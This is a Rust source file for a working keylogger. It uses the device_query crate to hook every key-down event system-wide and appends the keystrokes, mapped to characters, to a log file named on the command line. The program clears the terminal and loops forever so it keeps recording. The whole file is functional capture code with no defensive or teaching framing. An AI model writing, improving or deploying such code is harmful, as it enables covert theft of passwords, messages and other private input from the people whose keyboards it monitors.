use std::env;
use std::io::Write;
use std::fs::{File, OpenOptions};
use device_query::{DeviceEvents, DeviceState, Keycode};

// This function creates a file with given name at second argument
pub fn create_file() -> std::io::Result<()> {
    println!("Creating a file in case of there isn't any...");
    let args: Vec<String> = env::args().collect();
    let filename = &args[1];
    File::create(filename)?;
    Ok(())
}

// All of the keylogging and parsing process
pub fn keyloggs() {

    // Setting new device state and listening to events
    let device_state = DeviceState::new();
    let _guard = device_state.on_key_down(move |key| {

        // Parsing arguments and opening the file with write permission
        let args: Vec<String> = env::args().collect();
        let filename = &args[1];
        let mut file = OpenOptions::new()
            .write(true)
            .read(true)
            .append(true)
            .open(filename)
            .expect("Something went wrong while opening the file!");
        let data = &key.to_string().to_lowercase(); // Default data to log

        // Log parser
        match key {
            &Keycode::LShift |
            &Keycode::RShift |
            &Keycode::LControl |
            &Keycode::RControl |
            &Keycode::Escape |
            &Keycode::CapsLock |
            &Keycode::Meta |
            &Keycode::Backspace |
            &Keycode::Delete => {
                let data = "[".to_owned() + &key.to_string() + "]";
                file.write(data.as_bytes()).expect("Something went wrong while editing the file!")
            }
            &Keycode::Key0 |
            &Keycode::Key1 |
            &Keycode::Key2 |
            &Keycode::Key3 |
            &Keycode::Key4 |
            &Keycode::Key5 |
            &Keycode::Key6 |
            &Keycode::Key7 |
            &Keycode::Key8 |
            &Keycode::Key9 |
            &Keycode::Numpad0 |
            &Keycode::Numpad1 |
            &Keycode::Numpad2 |
            &Keycode::Numpad3 |
            &Keycode::Numpad4 |
            &Keycode::Numpad5 |
            &Keycode::Numpad6 |
            &Keycode::Numpad7 |
            &Keycode::Numpad8 |
            &Keycode::Numpad9 => {
                let data = &key.to_string().chars().last().unwrap();
                file.write(data.to_string().as_bytes()).expect("Something went wrong while editing the file!")
            }
            &Keycode::Enter => file.write(b"\n").expect("Something went wrong while editing the file!"),
            &Keycode::Space => file.write(b" ").expect("Something went wrong while editing the file!"),
            &Keycode::Equal => file.write(b"=").expect("Something went wrong while editing the file!"),
            &Keycode::Minus => file.write(b"-").expect("Something went wrong while editing the file!"),
            &Keycode::NumpadAdd => file.write(b"+").expect("Something went wrong while editing the file!"),
            &Keycode::NumpadDivide => file.write(b"/").expect("Something went wrong while editing the file!"),
            &Keycode::Apostrophe => file.write(b",").expect("Something went wrong while editing the file!"),
            &Keycode::Slash => file.write(b"/").expect("Something went wrong while editing the file!"),
            &Keycode::BackSlash => file.write(b"\\").expect("Something went wrong while editing the file!"),
            &Keycode::Semicolon => file.write(b";").expect("Something went wrong while editing the file!"),
            &Keycode::LeftBracket => file.write(b"[").expect("Something went wrong while editing the file!"),
            &Keycode::RightBracket => file.write(b"]").expect("Something went wrong while editing the file!"),
            _ => file.write(data.as_bytes()).expect("Something went wrong while editing the file!"),
        };

        // Clearing terminal and showing a message
        print!("\x1B[2J\x1B[1;1H");
        println!("Running...");
    });
    loop {} // Starts a loop so program doesn't die
}
